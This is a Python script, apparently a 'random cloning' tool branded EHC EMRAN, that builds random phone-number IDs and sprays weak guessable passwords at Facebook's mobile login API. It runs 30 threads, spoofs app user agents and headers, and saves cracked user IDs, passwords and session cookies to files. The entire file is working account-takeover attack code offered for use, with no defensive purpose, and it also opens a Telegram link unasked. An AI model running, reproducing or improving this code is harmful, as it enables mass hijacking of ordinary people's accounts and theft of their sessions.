
import os
import sys
import json
import uuid
import string
import random
try:
    import requests 
except ImportError:
    print(f'\x1b[38;5;46m[\033[38;5;46m=\x1b[38;5;46m] INSTALLING REQUESTS ')
    os.system('pip install requests')              
from concurrent.futures import ThreadPoolExecutor as tred
class Mr_Code:
    def __init__(self):
        self.loop = 0
        self.oks = []
        self.cps = []
        self.gen = []    
    def banner(self):
        os.system("clear")
        os.system("xdg-open https://t.me/+HxGKajAyTn9jNGFi")
        print("\033[38;5;46m======================")
        print("\033[37;1mEHC EMRAN ")       
        print("\033[38;5;46m======================")
        
    
    def Main(self):
        self.banner()
        code = input("𝟎𝟏𝟕-𝟎𝟏𝟖-𝟎𝟏𝟗--𝐁𝐚𝐬𝐭 𝐜𝐨𝐝𝐞 𝟎𝟏𝟕 : ")
        limit = int(input("𝟓𝟎𝟎𝟎-𝟐𝟎𝟎𝟎-𝟏𝟎𝟎𝟎-𝟏𝟎𝟎𝟎𝟎--𝐁𝐚𝐬𝐭 𝟓𝟎𝟎𝟎: "))
        for a in range(limit):
            xxx = "".join(random.choice(string.digits) for _ in range(8))
            self.gen.append(xxx)
        with tred(max_workers=30) as randx:
            print("\033[38;5;46mBD CYBER")           
            for love in self.gen:
                ids = code + love
                passlist = [ids,ids[:8],ids[:7],ids[:6],love,love[1:],love[2:],"i love you","ff lover"]
                randx.submit(self.method,ids,passlist)
        print("\n")
        print("\033[38;5;46m••••••••••••••••••••••••")    
    def method(self,ids,passlist):
        global loop,oks,cps
        sys.stdout.write(f"\r\r\x1b[mBD-CYBER {self.loop}|RND|OK:-{len(self.oks)}|CP:-{len(self.cps)}")
        sys.stdout.flush()
        try:
            for pas in passlist:
                data = {
                'adid':str(uuid.uuid4()),
                'format':'json',
                'device_id':str(uuid.uuid4()),
                'email':ids,
                'password':pas,
                'generate_analytics_claims':'1',
                'community_id':'',
                'cpl':'true',
                'try_num':'1',
                'family_device_id':str(uuid.uuid4()),
                'credentials_type':'password',
                'source':'login',
                'error_detail_type':'button_with_disabled',
                'enroll_misauth':'false',
                'generate_session_cookies':'1',
                'generate_machine_id':'1',
                'currently_logged_in_userid':'0',
                'locale':'en_US',
                'client_country_code':'US',
                'fb_api_req_friendly_name':'authenticate',
                'api_key':'882a8490361da98702bf97a021ddc14d',
                'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
                head = {
                'User-Agent': ____uax____(),
                'Accept-Encoding':'gzip, deflate',
                'Connection':'close',
                'Content-Type':'application/x-www-form-urlencoded',
                'Host':'graph.facebook.com',
                'X-FB-Net-HNI':str(random.randint(20000, 40000)),
                'X-FB-SIM-HNI':str(random.randint(20000, 40000)),
                'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'X-FB-Connection-Type':'MOBILE.LTE',
                'X-Tigon-Is-Retry':'False',
                'x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                'x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags':'graphservice',
                'X-FB-HTTP-Engine':'Liger',
                'X-FB-Client-IP':'True',
                'X-FB-Server-Cluster':'True',
                'x-fb-connection-token':'d29d67d37eca387482a8a5b740f84f62'}
                url = "https://graph.facebook.com/auth/login"
                response = requests.post(url,data=data,headers=head).json()
                if "access_token" in response:
                    uid = str(response['uid'])
                    coki = ";".join(i["name"] + "=" + i["value"] for i in response["session_cookies"])
                    print(f"\r\r\x1b[38;5;46mEMRAN-OK • {uid} • {pas}")
                    open("/sdcard/EHC-EMRAan-OK.txt","a").write(uid+"|"+pas+"|"+coki+"\n")
                    self.oks.append(uid)
                    break
                elif "www.facebook.com" in response["error"]["message"]:
                    open("/sdcard/EHC-EMRAan-CP.txt","a").write(ids+"|"+pas+"\n")
                    self.cps.append(ids)
                    break
                else:continue
            self.loop += 1
        except Exception as e:pass
def FOYSAL():
	android_version = f"{random.randint(4, 13)}.{random.randint(0, 5)}.{random.randint(1, 5)}"
	model=random.choice(['Infinix X677','Infinix X680','Infinix X6850B','Infinix X6525','Infinix X6820','Infinix X677','Infinix X6851B','Infinix X676B','Infinix X559C','Infinix X608','Infinix X606B'])
	buildx=random.choice(['SP1A.210812.016','QP1A.190711.020','UP1A.231005.007','TP1A.220624.014','UP1A.231005.007','NRD90M','OPR1.170623.032','O11019','MRA58K'])
	fb_version = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
	fb_version_code = str(random.randint(10000000, 66666666))
	density = random.choice(['{density=3.0,width=1080,height=2401}','{density=3.0,width=1080,height=2161}','{density=1.5,width=1280,height=720}','{density=2.0,width=720,height=1344}','{density=1.75,width=720,height=1488}','{density=1.0,width=1066,height=552}','{density=2.0,width=480,height=854}','{density=1.5,width=1200,height=1848}','{density=1.3312501,width=1280,height=736}','{density=3.0,width=1080,height=2208}','{density=4.0,width=1440,height=2392}','{density=1.0,width=320,height=480}','{density=3.0,width=1080,height=1920}','{density=1.46875,width=720,height=1510}','{density=2.625,width=1080,height=2034}','{density=1.5,width=1200,height=1920}','{density=2.0,width=720,height=1280}','{density=2.0,width=720,height=1448}','{density=1.275,width=540,height=1071}'])	
	ua='Dalvik/2.1.0 (Linux; U; Android'+android_version+'; '+model+' Build/'+buildx+'; wv) [FBAN/Orca-Android;FBAV/'+fb_version+';FBPN/com.facebook.orca;FBLC/es_US;FBBV/'+fb_version_code+';FBCR/TELCEL;FBMF/Infinix;FBBD/Infinix;FBDV/'+model+';FBSV/'+android_version+';FBCA/arm64-v8a:null;FBDM/'+density+';FB_FW/1;]'
	return ua
def ____uax____():
	fb_version = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
	fb_version_code = str(random.randint(10000000, 66666666))
	density = random.choicedensity = random.choice(['1.0', '1.5', '1.7', '2.0', '2.5', '2.25', '3.0'])
	width = random.randint(720, 1440)
	height = random.randint(1080, 2560)
	fbrv = str(random.randint(000000000,999999999))
	sim_name = random.choice(['Telenor','fido','MOVO AFRICA','UFONE-PAKTel','Zong','Jazz','SCO','Jio','Vodafone','Airtel','BSNL','MTNL','Grameenphone','Robi','Banglalink','Teletalk','Telkomsel','Indosat Ooredoo','Axiata','Tri','Smartfren','China Mobile','Unicom','Telecom','Satcom','Docomo','Rakuten','IIJmio','Orange','Verizon','AT&T','T-Mobile','Sprint','Vodafone','Telefonica','EE','Orange','Three'])
	county_code = random.choice(["en_US", "en_GB"])
	android_version = f"{random.randint(4, 13)}.{random.randint(0, 5)}.{random.randint(1, 5)}"
	android_model = random.choice(["RMX1945","RMX1911","RMX2193","RMX1931","RMX2170","RMX3201","RMX2180","RMX2021","RMX2020","RMX1921","RMX2156","RMX3363","RMX3081","RMX2001","RMX3263","RMX2155","RMX3195","RMX1993"])
	user_agent1 = f"[FBAN/FB4A;FBAV/{fb_version};FBBV/{fb_version_code};FBDM/{{density={density},width={width},height={height}}};FBLC/{county_code};FBCR/{sim_name};FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/{android_model};FBSV/{android_version};FBOP/1;FBCA/armeabi-v7a:armeabi;]"
	user_agent2 = f"[FBAN/FB4A;FBAV/{fb_version};FBBV/{fb_version_code};FBDM/{{density={density},width={width},height={height}}};FBLC/{county_code};FBRV/{fbrv};FBCR/{sim_name};FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/{android_model};FBSV/{android_version};FBOP/1;FBCA/arm64-v8a:;]"
	user_agent1 = f"[FBAN/FB4A;FBAV/{fb_version};FBBV/{fb_version_code};FBDM/{{density={density},width={width},height={height}}};FBLC/{county_code};FBRV/{fbrv};FBCR/{sim_name};FBMF/realme;FBBD/realme;FBPN/com.facebook.katana;FBDV/{android_model};FBSV/{android_version};FBBK/1;FBOP/1;FBCA/arm64-v8a:;]"
	user_agent2 = f"[FBAN/FB4A;FBAV/{fb_version};FBBV/{fb_version_code};FBDM/{{density={density},width={width},height={height}}};FBLC/{county_code};FBRV/{fbrv};FBCR/{sim_name};FBMF/Realme;FBBD/Realme;FBPN/com.facebook.katana;FBDV/{android_model};FBSV/{android_version};FBOP/1;FBCA/armeabi-v7a:armeabi;]" 
	return random.choice([user_agent1,user_agent2])       
def randua(self):
        ua1 = "[FBAN/FB4A;FBAV/381.0.0.29.105;FBBV/392505018;FBDM/{density=2.75,width=1080,height=2177};FBLC/en_US;FBRV/0;FBCR/Airtel;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2101K7AG;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]"
        ua2 = "[FBAN/FB4A;FBAV/380.0.0.29.109;FBBV/390885025;FBDM/{density=2.75,width=1080,height=2062};FBLC/en_US;FBRV/392634595;FBCR/Jio 4G;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 6 Pro;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]"
        ua3 = "[FBAN/FB4A;FBAV/348.0.0.39.118;FBBV/338918983;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBRV/342775358;FBCR/Airtel;FBMF/samsung;FBBD/Verizon;FBPN/com.facebook.katana;FBDV/SM-J327VPP;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
        ua4 = "[FBAN/FB4A;FBAV/376.0.0.12.108;FBBV/383919090;FBDM/{density=2.0,width=720,height=1448};FBLC/en_US;FBRV/385738515;FBCR/WIFI;FBMF/realme;FBBD/realme;FBPN/com.facebook.katana;FBDV/RMX3195;FBSV/12;FBOP/1;FBCA/arm64-v8a:;]"
        ua5 = "[FBAN/FB4A;FBAV/369.0.0.18.103;FBBV/373751961;FBDM/{density=3.0,width=1080,height=2032};FBLC/en_US;FBRV/374681835;FBCR/Telenor SE;FBMF/HUAWEI;FBBD/HONOR;FBPN/com.facebook.katana;FBDV/LLD-L31;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]"
        max = random.choice([ua1,ua2,ua3,ua4,ua5])
        return str(max)
if __name__ == "__main__":
    Mr_Code().Main()
    
